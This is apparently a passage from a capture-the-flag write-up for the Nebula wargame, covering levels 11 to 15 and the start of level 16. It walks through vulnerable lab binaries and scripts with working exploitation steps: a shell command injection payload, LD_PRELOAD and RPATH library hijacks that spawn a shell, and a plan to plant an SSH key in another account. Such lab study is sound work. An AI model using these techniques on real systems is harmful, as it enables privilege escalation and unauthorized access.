  <li>On the host machine we see that netcat is receiving a lot of things, and among them there is a weird-looking string. This string is generated when we manage to trigger the race condition properly, and as in one of the previous challenges, we can use it as password to <code class="language-plaintext highlighter-rouge">su</code> to the flag10 account, and from there execute <code class="language-plaintext highlighter-rouge">getflag</code></li>
</ol>

<h3 id="level-11">[Level 11]</h3>
<p>A binary processes standard input and executes a shell command.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//Return a random, non predictable file, and return the file descriptor for it.</span>
<span class="kt">int</span> <span class="nf">getrand</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="n">path</span><span class="p">){</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">pid</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>

    <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>

    <span class="n">tmp</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"TEMP"</span><span class="p">);</span>
    <span class="n">pid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
    
    <span class="n">asprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">"%s/%d.%c%c%c%c%c%c"</span><span class="p">,</span> <span class="n">tmp</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span>
        <span class="sc">'A'</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span> <span class="sc">'0'</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10</span><span class="p">),</span>
        <span class="sc">'a'</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span> <span class="sc">'A'</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span>
        <span class="sc">'0'</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10</span><span class="p">),</span> <span class="sc">'a'</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">));</span>

    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_RDWR</span><span class="p">,</span> <span class="mo">0600</span><span class="p">);</span>
    <span class="n">unlink</span><span class="p">(</span><span class="o">*</span><span class="n">path</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">fd</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">process</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">){</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>

    <span class="n">key</span> <span class="o">=</span> <span class="n">length</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>

    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">;</span>
        <span class="n">key</span> <span class="o">-=</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
    <span class="p">}</span>

    <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="cp">#define CL "Content-Length: "
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">mem</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">length</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"reading from stdin"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">CL</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">CL</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"invalid header"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">length</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">CL</span><span class="p">));</span>
    
    <span class="k">if</span><span class="p">(</span><span class="n">length</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">!=</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"fread length"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">process</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="kt">int</span> <span class="n">blue</span> <span class="o">=</span> <span class="n">length</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">pink</span><span class="p">;</span>

        <span class="n">fd</span> <span class="o">=</span> <span class="n">getrand</span><span class="p">(</span><span class="o">&amp;</span><span class="n">path</span><span class="p">);</span>

        <span class="k">while</span><span class="p">(</span><span class="n">blue</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"blue = %d, length = %d, "</span><span class="p">,</span> <span class="n">blue</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>

            <span class="n">pink</span> <span class="o">=</span> <span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"pink = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pink</span><span class="p">);</span>

            <span class="k">if</span><span class="p">(</span><span class="n">pink</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"fread fail(blue = %d, length = %d)"</span><span class="p">,</span> <span class="n">blue</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">pink</span><span class="p">);</span>
            <span class="n">blue</span> <span class="o">-=</span> <span class="n">pink</span><span class="p">;</span>
        <span class="p">}</span>    

        <span class="n">mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">mem</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"mmap"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">process</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>File descriptor: an FD is a handle used to access a file or IO resources. It’s a non-negative integer (negative values indicate “no value” or an error). Each Unix process (except perhaps a daemon) should expect to have three standard POSIX file descriptors, corresponding to the three standard streams: 0 for standard input, 1 for standard output and 2 for standard error.
File descriptors index into a per-process table maintained by the kernel, that in turn indexes into a system-wide table of files opened by all processes, called the file table. This table records the mode with which the file has been opened: for reading, writing, appending, and possibly other modes. It also indexes into a third table called the inode table that describes the actual underlying files. To perform input or output, the process passes the file descriptor to the kernel through a system call, and the kernel will access the file on behalf of the process. The process does not have direct access to the file or inode tables.
On Linux, the set of file descriptors open in a process can be accessed under the path /proc/PID/fd/, where PID is the process identifier.</p>
</blockquote>

<blockquote>
  <p>size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream): the function reads nmemb elements of data, each size bytes long, from the stream pointed to by stream, storing them at the location given by ptr. It returns the number of items successfully read (not the number of characters).</p>
</blockquote>

<ol>
  <li>The code reads from the standard input, checks for “Content-Length: “, reads an integer representing a length and processes it. Then if the length is less than the buf length (1024) fread is called.</li>
  <li>To access the call to <code class="language-plaintext highlighter-rouge">process()</code> we have to pass 1 as the CL integer, so that the amount of read characters corresponds to their length. This character is the second input that we will give to the function.</li>
  <li>After a couple of attempts with inputs like <code class="language-plaintext highlighter-rouge">Content-Length: 1\nX</code> we see that the result is always a letter (a fixed one for each input) and some hex values. As we are allowed to pass only a single char we can not give a properly null-terminated string, but after some more attempts it shows that the hex values are probably from the uninitialzed portion of the array, and therefore null bytes are not uncommon.</li>
  <li>Given that the flag11 file has SUID permissions, if we manage to use it to run the <code class="language-plaintext highlighter-rouge">getflag</code> command it should work properly. To do this, we create a symlink to <code class="language-plaintext highlighter-rouge">/bin/getflag</code> (we know the location thanks to <code class="language-plaintext highlighter-rouge">whereis</code>) with the name of a known output. In our case, if we pass “X”, we set the symlink with <code class="language-plaintext highlighter-rouge">ln -s /bin/getflag /tmp/Y</code>.</li>
  <li>We have to add this path to the variable <code class="language-plaintext highlighter-rouge">PATH</code>, so that it will be checked for executables before the proper bin path: <code class="language-plaintext highlighter-rouge">export PATH=/tmp/:$PATH</code>. To make sure we run the program until we get a properly null terminated line, which will run the command.</li>
  <li>However, when we manage to execute the command the returned string says that we are not on the proper account. This is due to the fact that there is no call to setresuid/setresgid, meaning that everything will run as the real UID (level11) instead of the effective UID (flag11).</li>
  <li>In the flag11 folder there is also a .ssh subfolder, which might be useful. If we manage to inject an authorized-key file here, we will have access to the flag11 account. To do this, we try to access the <code class="language-plaintext highlighter-rouge">process()</code> on the else-branch in the main function. The idea is to take control of the “unpredictable” path that will be created, and to force it to be a file containing our ssh key.</li>
</ol>

<p>At this point, I have to admit I am not entirely sure how this approach works: a nice <a href="https://gist.github.com/graugans/88e6f54c862faec8b3d4bf5789ef0dd9">writeup by graugans</a> gives the code and explains the idea a bit better, in case you want more details on how to proceed further.</p>

<h3 id="level-12">[Level 12]</h3>
<p>There is a backdoor process listening on port 50001.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">local</span> <span class="n">socket</span> <span class="o">=</span> <span class="n">require</span><span class="p">(</span><span class="s">"socket"</span><span class="p">)</span>
<span class="n">local</span> <span class="n">server</span> <span class="o">=</span> <span class="n">assert</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">bind</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">50001</span><span class="p">))</span>

<span class="n">function</span> <span class="n">hash</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
    <span class="n">prog</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">"echo "</span><span class="p">..</span><span class="n">password</span><span class="p">..</span><span class="s">" | sha1sum"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">prog</span><span class="o">:</span><span class="n">read</span><span class="p">(</span><span class="s">"*all"</span><span class="p">)</span>
    <span class="n">prog</span><span class="o">:</span><span class="n">close</span><span class="p">()</span>

    <span class="n">data</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">sub</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">40</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">data</span>
<span class="n">end</span>

<span class="k">while</span> <span class="mi">1</span> <span class="k">do</span>
    <span class="n">local</span> <span class="n">client</span> <span class="o">=</span> <span class="n">server</span><span class="o">:</span><span class="n">accept</span><span class="p">()</span>
    <span class="n">client</span><span class="o">:</span><span class="n">send</span><span class="p">(</span><span class="s">"Password: "</span><span class="p">)</span>
    <span class="n">client</span><span class="o">:</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
    <span class="n">local</span> <span class="n">line</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">client</span><span class="o">:</span><span class="n">receive</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">not</span> <span class="n">err</span> <span class="n">then</span>
        <span class="n">print</span><span class="p">(</span><span class="s">"trying "</span> <span class="p">..</span> <span class="n">line</span><span class="p">)</span> <span class="o">--</span> <span class="n">log</span> <span class="n">from</span> <span class="n">where</span> <span class="p">;</span>\
        <span class="n">local</span> <span class="n">h</span> <span class="o">=</span> <span class="n">hash</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">h</span> <span class="o">~=</span> <span class="s">"4754a4f4bd5787accd33de887b9250a0691dd198"</span> <span class="n">then</span>
            <span class="n">client</span><span class="o">:</span><span class="n">send</span><span class="p">(</span><span class="s">"Better luck next time</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">else</span>
            <span class="n">client</span><span class="o">:</span><span class="n">send</span><span class="p">(</span><span class="s">"Congrats, your token is 413**CARRIER LOST**</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">end</span>
    <span class="n">end</span>

    <span class="n">client</span><span class="o">:</span><span class="n">close</span><span class="p">()</span>
<span class="n">end</span>
</code></pre></div></div>

<ol>
  <li>Without knowing how Lua works, it is clear that an injection might happen in the <code class="language-plaintext highlighter-rouge">hash()</code> method, where the input is passed without sanitization to an instruction that clearly calls a shell command.</li>
  <li>We can connect to the process using telnet: <code class="language-plaintext highlighter-rouge">telnet 127.0.0.1 50001</code>. We will be prompted for a password, and this is our opportunity.</li>
  <li>We have to close the previous running command and run our own, so our password will be ``; /bin/getflag &gt; /tmp/flag12`.</li>
  <li>The telnet connection will be closed because obviously we gave a wrong password, but if we check the /tmp/flag12 file we can see that our command has been executed properly (this worked because the command executed before the actual password check).</li>
</ol>

<h3 id="level-13">[Level 13]</h3>
<p>A security check that prevents execution if the user invoking it does not match a specific user id.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define FAKEUID 1000
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">c</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">token</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

    <span class="k">if</span><span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">!=</span> <span class="n">FAKEUID</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Security failure detected. UID %d started us, we expect %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">getuid</span><span class="p">(),</span> <span class="n">FAKEUID</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"The system administrators will be notified of this violation</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// snip, sorry :)</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"your token is %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">token</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>uid_t getuid(void): the function returns the real user ID of the calling process.</p>
</blockquote>

<blockquote>
  <p>LD_PRELOAD: this is an optional environmental variable containing paths to shared libraries that the loader will load before any other shared library including the C runtime library. Functions from preloaded libraries will be used before others of the same name in later libraries. This enables library functions to be intercepted and replaced.</p>
</blockquote>

<ol>
  <li>It is pretty clear that there are not many possibilities to solve this challenge, because we can’t go around the code, and it allows no injection. Also, I don’t know of any way to modify the UID (and I hope no way actually exists). So we have to modify the behavior of the code.</li>
  <li>We know that <code class="language-plaintext highlighter-rouge">getuid</code> is taken from a shared library, and therefore if we define <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> we should be able to overwrite it with a function with the same name but a different behavior. To do this we create a <code class="language-plaintext highlighter-rouge">fakelib.c</code> file with the following code: <code class="language-plaintext highlighter-rouge">int getuid() { return 1000; }</code></li>
  <li>Compile this code using <code class="language-plaintext highlighter-rouge">gcc -shared -fPIC -o /home/level13/fake.so /home/level13/fake.c</code> (the -shared and -fPIC arguments are for position independent code).</li>
  <li>We can’t run directly the flag13 program just after setting the <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> variable, because for security reasons SETUID programs discard that variable. However, in the code there is a snipped part, and it might very well be that that’s the part that will print out the token that we need. 5. This means that if we just copy the file (copy will not keep the SUID permission) and execute the copy with our library, we should get the password: <code class="language-plaintext highlighter-rouge">LD_PRELOAD=/tmp/fake.o ./flag13_copy</code></li>
  <li>With the password we can access the flag13 account with <code class="language-plaintext highlighter-rouge">su</code> and execute <code class="language-plaintext highlighter-rouge">getflag</code></li>
</ol>

<h3 id="level-14">[Level 14]</h3>
<p>Encrypting input and writeing it to stdout. An encrypted token is also in home directory.</p>

<ol>
  <li>
    <p>We run the flag14 program with the <code class="language-plaintext highlighter-rouge">-e</code> parameter, and we see that it reads the standard input and writes a modified output of the same length. 2. Playing around a bit with inputs like “AAAAA” and “11111” shows that the encryption function is quite easy: to each element ASCII decimal value we add its position.</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">def</span> <span class="nf">encr</span><span class="p">(</span><span class="n">e</span><span class="p">):</span>
     <span class="n">r</span> <span class="o">=</span> <span class="p">[]</span>
     <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
     <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">e</span><span class="p">:</span>
         <span class="n">r</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
         <span class="n">i</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span>
     <span class="k">for</span> <span class="n">el</span> <span class="ow">in</span> <span class="n">r</span><span class="p">:</span>
         <span class="nf">print</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">el</span><span class="p">))</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>To decrypt the text that is in the token file, we need to write the opposite function: instead of adding its position to each element, we subtract it. As we are moving backwards, we have to remember to reverse the resulting output before printing it:</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">def</span> <span class="nf">decr</span><span class="p">(</span><span class="n">d</span><span class="p">):</span>
     <span class="n">r</span> <span class="o">=</span> <span class="p">[]</span>
     <span class="n">s</span> <span class="o">=</span> <span class="p">[]</span>
     <span class="n">i</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">d</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span>
     <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">d</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
         <span class="n">r</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span>
         <span class="n">i</span> <span class="o">=</span> <span class="n">i</span><span class="o">-</span><span class="mi">1</span>
     <span class="k">for</span> <span class="n">el</span> <span class="ow">in</span> <span class="n">r</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
         <span class="n">s</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">el</span><span class="p">))</span>
     <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
</code></pre></div>    </div>
  </li>
  <li>It’s not the most elegant solution ever, but if we feed the content of the token file to the <code class="language-plaintext highlighter-rouge">decr()</code> method, the result will be the password for the flag14 user.</li>
  <li>At this point, it’s enough to use <code class="language-plaintext highlighter-rouge">su</code> to access the account and run <code class="language-plaintext highlighter-rouge">getflag</code></li>
</ol>

<h3 id="level-15">[Level 15]</h3>
<p>strace the binary flag15 and see if you spot anything out of the ordinary.</p>

<blockquote>
  <p>strace: intercepts and records the system calls which are called by a given process and the signals which are received by a process. The name of each system call, its arguments and its return value are printed on stderr.</p>
</blockquote>

<blockquote>
  <p>RPATH: this designates the run-time search path hard-coded in the header of an executable file. Dynamic linking loaders use the rpath to find required libraries. This path may override the system default dynamic linking search paths, and is not subject to the SUID restriction like LD_PRELOAD. The content of the variable can be seen with objdump -p [filename] in the dynamic section.</p>
</blockquote>

<blockquote>
  <p>Relocation table: this table is a list of pointers stored in the executable file. Each entry in the table points to an absolute address in the object code that must be changed when the loader relocates the program so that it will refer to the correct location (for example of a library function). This table can be seen with objdump -R [filename]</p>
</blockquote>

<ol>
  <li>We are told to run <code class="language-plaintext highlighter-rouge">strace</code> on flag15, and by doing that we can see that the program is trying to load the library “libc.so.6” from a bunch of locations. This suggests an approach similar to the one of Level13, but the SUID limiation forces us to take another road.</li>
  <li>From all the data dumped with strace, we can see that one of the locations where the program looks for the library is /var/tmp/flag15. If we look at that folder permissions we can see that it’s writable, and a look at the file15 file with <code class="language-plaintext highlighter-rouge">objdump -p</code> confirms that it’s where we should try to put the file. So let’s <code class="language-plaintext highlighter-rouge">touch /var/tmp/flag15/libc.so.6</code> and run the program again (this time without strace).</li>
  <li>Running the program shows that flag15 found our library, but obviously it’s complaining that there is nothing useful in it. Therefore we can find out which methods should be in there and implement one with something useful for us.</li>
  <li>To do that we can look in the relocation table which functions are needed, using <code class="language-plaintext highlighter-rouge">objdump -R</code>. From the resulting list, <code class="language-plaintext highlighter-rouge">__libc_start_main</code> seems like the most promising method: after some googling, it turns out that it’s used to call main, meaning that whatever it does will happen as first, reducing the chance of problems.</li>
  <li>
    <p>As we did in Level13, we create a <code class="language-plaintext highlighter-rouge">fake.c</code> file containing a fake implementation of <code class="language-plaintext highlighter-rouge">__libc_start_main</code>. Remember however to use the proper signature of the function, with the correct arguments and return type. The content of the function should be a call to system() to spawn a shell for us:</p>

    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kt">int</span> <span class="nf">__libc_start_main</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span><span class="p">),</span> <span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span> <span class="n">ubp_av</span><span class="p">,</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">init</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">rtld_fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span> <span class="n">stack_end</span><span class="p">))</span> <span class="p">{</span>
     <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
 <span class="p">}</span>
</code></pre></div>    </div>
  </li>
  <li>Then compile the file with <code class="language-plaintext highlighter-rouge">gcc -shared -fPIC -o /var/tmp/flag15/libc.so.6 /tmp/fake15.c</code> and try running flag15 again.</li>
  <li>The error that we get this time means two things: that symbol <code class="language-plaintext highlighter-rouge">__cxa_finalize</code> is undefined, and that we are missing the version of the library. 8. The first problem is solved by inserting an implementation for the <code class="language-plaintext highlighter-rouge">__cxa_finalize</code> method in our fake library. It doesn’t have to do anything, just give it a return statement and that’s enough.</li>
  <li>The second problem requires us to create a version file containing <code class="language-plaintext highlighter-rouge">GLIBC_2.0 {}</code>. We have now to recompile our library passing the version file: <code class="language-plaintext highlighter-rouge">gcc -shared -fPIC -Wl,--version-script=/tmp/version -o /var/tmp/flag15/libc.so.6 /tmp/fake15.c</code></li>
  <li>Running flag15 now says that system is not defined. We do not want to rewrite its implementation, as we want it to work propely to call getflag. So instead of inserting it in our library, we decide to use static linking, meaning that the function will be copied in our compiled library instead of being accessed invoking an external library. To do this, we use <code class="language-plaintext highlighter-rouge">-Bstatic</code> and <code class="language-plaintext highlighter-rouge">-static-libgcc</code> to tell gcc to not link against shared libraries: <code class="language-plaintext highlighter-rouge">gcc -shared -static-libgcc -fPIC -Wl,--version-script=/tmp/version,-Bstatic -o /var/tmp/flag15/libc.so.6 /tmp/fake15.c</code></li>
  <li>Running flag15 again results in a sh session. If we run <code class="language-plaintext highlighter-rouge">whoami</code> we can see that we are in fact user flag15, and therefore we can run <code class="language-plaintext highlighter-rouge">getflag</code> successfully.</li>
</ol>

<h3 id="level-16">[Level 16]</h3>
<p>There is a perl script running on port 1616.</p>

<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env perl</span>

    <span class="k">use</span> <span class="nv">CGI</span> <span class="sx">qw{param}</span><span class="p">;</span>
    <span class="k">print</span> <span class="p">"</span><span class="s2">Content-type: text/html</span><span class="se">\n\n</span><span class="p">";</span>

    <span class="k">sub </span><span class="nf">login</span> <span class="p">{</span>
        <span class="nv">$username</span> <span class="o">=</span> <span class="vg">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
        <span class="nv">$password</span> <span class="o">=</span> <span class="vg">$_</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

        <span class="nv">$username</span> <span class="o">=~</span> <span class="sr">tr/a-z/A-Z/</span><span class="p">;</span> <span class="c1"># conver to uppercase</span>
        <span class="nv">$username</span> <span class="o">=~</span> <span class="sr">s/\s.*//</span><span class="p">;</span>        <span class="c1"># strip everything after a space</span>

        <span class="nv">@output</span> <span class="o">=</span> <span class="p">`</span><span class="sb">egrep "^</span><span class="si">$username</span><span class="sb">" /home/flag16/userdb.txt 2&gt;&amp;1</span><span class="p">`;</span>
        <span class="k">foreach</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@output</span><span class="p">)</span> <span class="p">{</span>
            <span class="p">(</span><span class="nv">$usr</span><span class="p">,</span> <span class="nv">$pw</span><span class="p">)</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="sr">/:/</span><span class="p">,</span> <span class="nv">$line</span><span class="p">);</span>
        
            <span class="k">if</span><span class="p">(</span><span class="nv">$pw</span> <span class="o">=~</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">sub </span><span class="nf">htmlz</span> <span class="p">{</span>
        <span class="k">print</span><span class="p">("</span><span class="s2">Login resuls</span><span class="p">");</span>
